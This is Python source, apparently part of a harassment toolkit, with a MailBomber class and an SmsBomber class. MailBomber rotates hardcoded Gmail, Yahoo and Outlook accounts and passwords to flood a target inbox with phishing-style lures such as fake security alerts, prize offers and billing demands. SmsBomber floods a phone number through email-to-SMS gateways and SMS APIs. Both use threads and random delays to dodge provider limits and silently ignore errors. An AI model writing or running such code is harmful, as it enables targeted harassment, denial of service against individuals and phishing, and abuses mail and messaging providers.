# ==================== MAIL BOMBER ====================

class MailBomber:
    def __init__(self):
        self.smtp_servers = [
            {"host": "smtp.gmail.com", "port": 587, "user": "bomberbot001@gmail.com", "pass": "Bomber@2024"},
            {"host": "smtp.gmail.com", "port": 587, "user": "bomberbot002@gmail.com", "pass": "Bomber@2024"},
            {"host": "smtp.gmail.com", "port": 587, "user": "bomberbot003@gmail.com", "pass": "Bomber@2024"},
            {"host": "smtp.gmail.com", "port": 587, "user": "bomberbot004@gmail.com", "pass": "Bomber@2024"},
            {"host": "smtp.gmail.com", "port": 587, "user": "bomberbot005@gmail.com", "pass": "Bomber@2024"},
            {"host": "smtp.mail.yahoo.com", "port": 587, "user": "bomberbot@yahoo.com", "pass": "Bomber@2024"},
            {"host": "smtp-mail.outlook.com", "port": 587, "user": "bomberbot@outlook.com", "pass": "Bomber@2024"},
        ]
        self.email_templates = [
            "URGENT: Your account has been compromised. Please verify immediately.",
            "SECURITY ALERT: Suspicious activity detected on your account.",
            "Your payment has been declined. Update your billing information.",
            "You have won a $1000 gift card! Click here to claim.",
            "Important: Your account will be suspended in 24 hours.",
            "Your password has been reset. If this wasn't you, click here.",
            "New login from unrecognized device. Verify your identity.",
            "Your tax refund is ready. Process your claim now.",
            "Your subscription has expired. Renew today to avoid interruption.",
            "Your order has been confirmed. Track your shipment here.",
            "Your account has been flagged for review. Contact support.",
            "Your verification code: {} - Do not share this with anyone.",
            "ACTION REQUIRED: Update your security settings now.",
            "Your account balance is low. Please add funds.",
            "Your profile has been viewed by {} people. Check who."
        ]
        self.subject_templates = [
            "URGENT: Account Alert",
            "Security Notification",
            "Payment Confirmation",
            "Congratulations! You've Won",
            "Account Suspension Notice",
            "Password Reset Request",
            "Login Alert",
            "Tax Document",
            "Subscription Renewal",
            "Order Confirmation",
            "Important Security Update",
            "Verification Required",
            "Account Update",
            "Low Balance Alert",
            "Profile Activity"
        ]
        self.used_servers = []
        self.server_lock = threading.Lock()
    
    def get_smtp_server(self):
        with self.server_lock:
            available = [s for s in self.smtp_servers if s not in self.used_servers]
            if not available:
                self.used_servers = []
                available = self.smtp_servers
            server = random.choice(available)
            self.used_servers.append(server)
            return server
    
    def send_email(self, target_email, count=100, threads=10):
        """Çoklu thread ile email bombalama"""
        print(f"[+] Starting mail bomb on {target_email} - {count} emails")
        
        def send_worker():
            for i in range(count // threads + 1):
                try:
                    server_info = self.get_smtp_server()
                    msg = MIMEMultipart()
                    msg['From'] = server_info['user']
                    msg['To'] = target_email
                    msg['Subject'] = random.choice(self.subject_templates) + f" #{random.randint(1,999999)}"
                    
                    body = random.choice(self.email_templates)
                    if "{}" in body:
                        body = body.format(random.randint(100000, 999999))
                    body += f"\n\nReference: {hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}"
                    body += f"\nID: {random.randint(10000000, 99999999)}"
                    
                    msg.attach(MIMEText(body, 'plain'))
                    
                    # Attachment fake
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(("Fake file " + str(random.random())).encode())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename=document_{random.randint(1,1000)}.txt')
                    msg.attach(part)
                    
                    server = smtplib.SMTP(server_info['host'], server_info['port'])
                    server.starttls()
                    server.login(server_info['user'], server_info['pass'])
                    server.send_message(msg)
                    server.quit()
                    
                    time.sleep(random.uniform(0.1, 1.0))
                except:
                    pass
        
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=send_worker)
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        for t in threads_list:
            t.join(timeout=1)
        
        print(f"[+] Mail bomb completed on {target_email}")

# ==================== SMS BOMBER ====================

class SmsBomber:
    def __init__(self):
        self.api_keys = [
            "YOUR_API_KEY_1",
            "YOUR_API_KEY_2",
            "YOUR_API_KEY_3"
        ]
        self.sms_services = [
            {"url": "https://textbelt.com/text", "key": "textbelt", "field": "key"},
            {"url": "https://api.txtlocal.com/send/", "key": "txtlocal", "field": "apikey"},
            {"url": "https://smsapi.free-mobile.fr/sendmsg", "key": "free", "field": "api_key"},
        ]
    
    def send_sms_via_gateway(self, phone_number, message, count=100, threads=5):
        """Email-to-SMS gateway ile bombalama"""
        print(f"[+] Starting SMS bomb via gateway on {phone_number} - {count} messages")
        
        def send_worker():
            for _ in range(count // threads):
                try:
                    gateway = random.choice(SMS_GATEWAYS)
                    email = gateway.format(phone_number)
                    
                    server_info = random.choice([
                        {"host": "smtp.gmail.com", "port": 587, "user": "bomberbot001@gmail.com", "pass": "Bomber@2024"},
                        {"host": "smtp.gmail.com", "port": 587, "user": "bomberbot002@gmail.com", "pass": "Bomber@2024"},
                    ])
                    
                    msg = MIMEText(message + f" [{random.randint(1,999999)}]")
                    msg['From'] = server_info['user']
                    msg['To'] = email
                    msg['Subject'] = f"SMS #{random.randint(1,999999)}"
                    
                    server = smtplib.SMTP(server_info['host'], server_info['port'])
                    server.starttls()
                    server.login(server_info['user'], server_info['pass'])
                    server.send_message(msg)
                    server.quit()
                    
                    time.sleep(random.uniform(0.5, 2.0))
                except:
                    pass
        
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=send_worker)
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        for t in threads_list:
            t.join(timeout=1)
        
        print(f"[+] SMS gateway bomb completed on {phone_number}")
    
    def send_sms_via_api(self, phone_number, message, count=50):
        """API üzerinden SMS bombalama"""
        print(f"[+] Starting SMS bomb via API on {phone_number} - {count} messages")
        
        for _ in range(count):
            try:
                service = random.choice(self.sms_services)
                data = {
                    "number": phone_number,
                    "message": message + f" [#{random.randint(1,999999)}]",
                    "key": random.choice(self.api_keys),
                    "apikey": random.choice(self.api_keys)
                }
                response = requests.post(service['url'], data=data, timeout=2)
                if response.status_code == 200:
                    print(f"[+] SMS sent: {response.text[:50]}")
                time.sleep(random.uniform(1, 3))
            except:
                pass
        
        print(f"[+] SMS API bomb completed on {phone_number}")

